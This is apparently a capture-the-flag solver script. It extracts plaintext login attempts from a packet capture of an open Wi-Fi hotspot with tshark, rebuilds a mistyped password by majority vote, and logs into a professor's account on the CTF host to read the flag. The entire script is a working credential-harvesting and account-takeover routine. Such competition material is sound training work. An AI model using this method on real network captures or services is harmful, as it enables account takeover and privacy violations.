#!/usr/bin/env python3
"""Task3 (Сопромёд) — recover a mistyped password from an open-WiFi pcap and read the flag.

Approach (see ``sopromed_task3_writeup.md`` §3 for the full reasoning):
  1. The capture is plaintext HTTP over an open metro Wi-Fi hotspot: ``tshark`` pulls 96
     ``POST /api/auth/login`` bodies straight out of it, every one of them a ``401``.
  2. All 96 attempts share the same username and the same 19-character password *shape*
     (``XXXXXX_XX34XX_XXXXXX``) — this is one secret retyped 96 times by a shaky hand, not
     a dictionary attack, so no single line is trustworthy.
  3. Typos are independent noise per character position, so the correct character is simply
     the *mode* (most common value) of each column across all 96 attempts — majority vote
     reconstructs the password even though no single attempt is fully correct.
  4. The recovered password logs in; the flag sits in ``GET /api/teacher/dashboard``.

Run::

    uv run python task3/solve_task3.py [pcap_path]
"""

from __future__ import annotations

import subprocess
import sys
from collections import Counter
from pathlib import Path

import requests

BASE = "https://sopromed-vlrdcf4v.avitoctf.ru"
LOGIN_USER = "prof_barsukov"
DEFAULT_PCAP = Path(__file__).resolve().parent / "sopromed_capture.pcap"
FLAG_MARKER = "avito{"
HTTP_OK = 200


def emit(message: str) -> None:
    """Write a single line to stdout (CLI output without ``print``)."""
    sys.stdout.write(message + "\n")


def extract_login_bodies(pcap: Path) -> list[str]:
    """Run tshark to pull the ``username,password`` JSON bodies of every login POST."""
    result = subprocess.run(
        [
            "tshark",
            "-r",
            str(pcap),
            "-Y",
            "http.request",
            "-T",
            "fields",
            "-e",
            "json.value.string",
        ],
        capture_output=True,
        text=True,
        check=True,
    )
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]


def recover_password(bodies: list[str]) -> str:
    """Recover the password by per-column majority vote (mode) across all login attempts."""
    attempts = []
    for line in bodies:
        parts = line.split(",")
        if len(parts) >= 2 and parts[0] == LOGIN_USER:
            attempts.append(parts[1])

    if not attempts:
        raise ValueError("no login attempts for the expected user found in the capture")

    length = len(attempts[0])
    if any(len(attempt) != length for attempt in attempts):
        raise ValueError("login attempts have inconsistent lengths — unexpected capture shape")

    emit(f"[recover] {len(attempts)} attempts, length {length}")
    columns = zip(*attempts, strict=True)
    return "".join(Counter(column).most_common(1)[0][0] for column in columns)


def scan_for_flag(text: str) -> str | None:
    """Return the ``avito{...}`` substring of *text*, or ``None`` if absent."""
    start = text.find(FLAG_MARKER)
    if start < 0:
        return None
    end = text.find("}", start)
    return text[start : end + 1] if end > 0 else None


def fetch_flag(password: str) -> str | None:
    """Log in as the professor and return the flag found on the teacher dashboard."""
    session = requests.Session()
    login_resp = session.post(
        f"{BASE}/api/auth/login",
        json={"username": LOGIN_USER, "password": password},
        timeout=30,
    )
    emit(f"[login] password={password!r} -> HTTP {login_resp.status_code}")
    if login_resp.status_code != HTTP_OK:
        return None

    dashboard_resp = session.get(f"{BASE}/api/teacher/dashboard", timeout=30)
    emit(f"[dashboard] HTTP {dashboard_resp.status_code}")
    return scan_for_flag(dashboard_resp.text)


def main() -> None:
    """Recover the password from the pcap, log in, and print the flag."""
    pcap = Path(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_PCAP
    if not pcap.exists():
        sys.exit(f"pcap not found: {pcap}")

    bodies = extract_login_bodies(pcap)
    emit(f"[pcap] {len(bodies)} login POST bodies extracted")

    password = recover_password(bodies)
    emit(f"[recover] password = {password!r}")

    flag = fetch_flag(password)
    if flag:
        emit(f"FLAG: {flag}")
    else:
        sys.exit("login/flag fetch failed — see log above")


if __name__ == "__main__":
    main()
